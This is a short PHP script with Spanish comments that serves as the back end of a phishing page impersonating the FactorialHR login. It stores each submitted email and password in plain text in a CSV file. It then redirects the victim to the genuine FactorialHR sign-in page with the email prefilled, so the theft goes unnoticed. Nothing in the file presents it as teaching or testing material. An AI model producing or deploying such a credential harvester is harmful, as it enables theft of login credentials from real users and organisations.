<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") 
{
    // Recoger los datos del formulario
    $email = htmlspecialchars($_POST["email"]);
    $password = htmlspecialchars($_POST["password"]);


    $fp = fopen("contactos.csv", 'a');
    fwrite($fp, $email . ";" . $password . ";" .  PHP_EOL);
    fclose($fp);

    header("Location: https://api.factorialhr.com/es/users/sign_in?user%5Bemail%5D=". $email);
} 

else {
    echo "Acceso no permitido.";
}
?>